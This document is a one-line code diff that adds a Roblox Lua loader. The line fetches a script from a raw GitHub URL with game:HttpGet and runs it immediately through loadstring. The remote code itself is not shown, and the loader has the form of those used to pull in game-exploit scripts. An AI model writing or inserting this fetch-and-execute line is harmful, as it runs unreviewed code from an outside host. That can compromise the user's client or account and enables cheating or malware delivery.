@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Testaccount927/Meme/refs/heads/main/Meme"))();
